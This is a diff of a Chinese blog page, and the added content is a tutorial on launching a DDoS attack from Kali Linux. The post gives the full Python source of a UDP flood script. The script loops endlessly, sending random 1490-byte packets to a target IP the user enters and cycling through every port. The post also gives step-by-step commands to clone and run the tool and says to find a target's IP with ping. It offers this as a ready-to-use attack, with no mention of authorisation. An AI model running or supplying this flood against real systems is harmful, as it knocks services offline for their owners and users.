@@ -3,7 +3,7 @@
 <html lang="ch">
 <head>
     <meta charset="utf-8" />
-    <title>page | 帅气怨言&#39;s Blog</title>
+    <title>如何使用kali来进行一次ddos攻击 | 帅气怨言&#39;s Blog</title>
     <meta name="author" content="shuaiqiyy" />
     <meta name="description" content="" />
     <meta name="keywords" content="shuaiqiyy,帅气怨言,sqyy," />
@@ -156,7 +156,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>page</h1>
+        <h1>如何使用kali来进行一次ddos攻击</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -166,11 +166,127 @@
             2024/8/24
         </span>
         
+        <span class="category">
+            <a href="/categories/%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/kali/" style="color: #00a596">
+                    kali
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%95%99%E7%A8%8B/" style="color: #ff7d73">
+                    教程
+                </a>
+            </span>
+            
+        </span>
         
     </div>
     
     <div class="content" v-pre>
-        
+        <h1 id="如何使用kali来进行一次ddos攻击"><a href="#如何使用kali来进行一次ddos攻击" class="headerlink" title="如何使用kali来进行一次ddos攻击"></a>如何使用kali来进行一次ddos攻击</h1><p>哈喽啊！好久不见</p>
+<p>这次我们将使用kail进行一次ddos攻击，</p>
+<h2 id="一、安装虚拟机"><a href="#一、安装虚拟机" class="headerlink" title="一、安装虚拟机"></a>一、安装虚拟机</h2><p>想必大家都应该了解虚拟机的安装，这里就不再赘述了，</p>
+<h2 id="二、安装kali系统"><a href="#二、安装kali系统" class="headerlink" title="二、安装kali系统"></a>二、安装kali系统</h2><p>如果您已经安装完成，请直接转到第三条   在kali的官网，您可以下载kali的vm虚拟机文件（可以省去安装系统的时间）</p>
+<h4 id="1-下载kali的vm虚拟机文件"><a href="#1-下载kali的vm虚拟机文件" class="headerlink" title="1.下载kali的vm虚拟机文件"></a>1.下载kali的vm虚拟机文件</h4><p>链接：<a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">kali</a></p>
+<p><img src="/img/ddos/1.jpg"></p>
+<p><img src="/img/ddos/2.jpg"></p>
+<h4 id="2-运行kali系统"><a href="#2-运行kali系统" class="headerlink" title="2.运行kali系统"></a>2.运行kali系统</h4><p>下载完成，使用vm虚拟机打开并运行，期间您不需要做任何操作直到出现输入用户名和密码时，kali默认的用户名和密码都是kali，输入后进入系统，至此您的kali系统已经安装完成啦</p>
+<p><img src="/img/ddos/3.jpg"></p>
+<h2 id="三、发起一次ddos攻击"><a href="#三、发起一次ddos攻击" class="headerlink" title="三、发起一次ddos攻击"></a>三、发起一次ddos攻击</h2><p>打开命令提示符，下载DDos-Attack python脚本 </p>
+<p><img src="/img/ddos/4.jpg"></p>
+<pre><code class="bash">git clone https://github.com/Elsa-zlt/DDos-Attack 
+</code></pre>
+<p>下载好之后，cd到DDos-Attack文件夹下 </p>
+<p><img src="/img/ddos/5.jpg"></p>
+<pre><code class="bash">cd DDos-Attack
+</code></pre>
+<p>修改（设置）对ddos-attack.py文件执行的权限</p>
+<p><img src="/img/ddos/6.jpg"></p>
+<pre><code class="bash">chmod +x ddos-attack.py
+</code></pre>
+<p>您的kali大部分的python是python3，而其python脚本是python2，所以您需要对ddos-attack.py文件进行一些简单的修改（对所以的print语句加上括号），您也可以直接复制以下源码</p>
+<pre><code class="python">import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system(&quot;clear&quot;)
+os.system(&quot;figlet DDos Attack&quot;)
+print
+print (&quot;Author   : HA-MRX&quot;)
+print (&quot;You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA&quot;)
+print (&quot;github   : https://github.com/Ha3MrX&quot;)
+print (&quot;Facebook : https://www.facebook.com/muhamad.jabar222&quot;)
+print
+ip = input(&quot;IP Target : &quot;)
+port = input(&quot;Port       : &quot;)
+port = int(port)
+
+os.system(&quot;clear&quot;)
+os.system(&quot;figlet Attack Starting&quot;)
+print (&quot;[                    ] 0% &quot;)
+time.sleep(5)
+print (&quot;[=====               ] 25%&quot;)
+time.sleep(5)
+print (&quot;[==========          ] 50%&quot;)
+time.sleep(5)
+print (&quot;[===============     ] 75%&quot;)
+time.sleep(5)
+print (&quot;[====================] 100%&quot;)
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print (&quot;Sent %s packet to %s throught port:%s&quot;%(sent,ip,port))
+     if port == 65534:
+       port = 1
+</code></pre>
+<p><img src="/img/ddos/7.jpg"></p>
+<p>执行ddos-attack.py程序（如果您的python是2版本的，就把3去掉）</p>
+<p><img src="/img/ddos/8.jpg"></p>
+<pre><code class="bash">python3 ddos-attack.py
+</code></pre>
+<p>出现这个界面（如果出现这个界面说明那个ddos-attack.py程序没有太大的问题了）</p>
+<p><img src="/img/ddos/9.jpg"></p>
+<p><img src="/img/ddos/10.jpg"></p>
+<p>第一个是填写攻击目标的ip地址，如果您不知道目标的ip地址，可以使用ping命令得到目标的ip 第二个是填写端口,输入完成后，敲击回车，一次ddos攻击便开始了</p>
+<p><img src="/img/ddos/11.jpg"></p>
+<p>您可以看见每次发送的请求,使用Ctrl+C结束攻击</p>
+
     </div>
     
     
